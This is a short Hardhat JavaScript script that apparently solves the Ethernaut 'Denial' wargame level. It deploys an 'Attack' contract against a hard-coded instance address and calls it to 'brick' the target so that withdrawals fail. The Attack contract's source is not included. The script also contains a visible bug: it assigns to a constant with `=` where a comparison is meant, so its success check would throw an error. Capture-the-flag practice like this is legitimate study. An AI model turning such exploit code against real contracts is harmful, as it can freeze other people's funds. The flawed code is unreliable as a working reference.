const hre = require("hardhat");

async function main() {
    const instanceAddress = "0x860a86f0038Fe4Ba6ce24c6eBC2b8BD901D7a26e"; // my Ethernaut Denial address- replace with $YOUR_ETHERNAUT_ADDRESS_HERE
    const Instance = await hre.ethers.getContractAt("Denial", instanceAddress);
    const balanceBefore = await Instance.contractBalance();

    const Attack = await hre.ethers.getContractFactory("Attack");
    const attack = await Attack.deploy(instanceAddress);

    await attack.deployed();

    console.log("Attack deployed to:", attack.address);
    
    const Contract = await hre.ethers.getContractAt("Attack", attack.address);
    await Contract.attack();

    const balanceAfter = await Instance.contractBalance();
    if (balanceBefore = balanceAfter) {
        console.log("Success! No funds were moved: Denial has been bricked.");
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});